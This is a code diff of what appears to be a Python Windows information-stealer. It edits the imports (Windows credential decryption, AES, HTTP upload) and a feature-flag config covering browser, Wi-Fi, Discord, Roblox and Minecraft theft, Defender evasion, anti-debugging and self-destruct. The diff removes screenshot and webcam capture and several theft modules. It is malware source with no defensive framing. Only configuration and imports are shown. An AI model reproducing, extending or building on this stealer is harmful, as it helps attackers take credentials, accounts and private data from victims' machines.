@@ -19,8 +19,6 @@ import binascii
 import psutil
 import requests
 from Cryptodome.Cipher import AES
-from PIL import ImageGrab
-import cv2
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
@@ -32,16 +30,9 @@ __CONFIG__ = {
     "startup": False,
     "defender": False,
     "systeminfo": False,
-    "backupcodes": False,
     "browser": False,
-    "roblox": False,
-    "obfuscation": False,
-    "injection": False,
-    "minecraft": False,
     "wifi": False,
-    "killprotector": False,
     "antidebug_vm": False,
-    "discord": False,
     "anti_spam": False,
     "self_destruct": False
 }
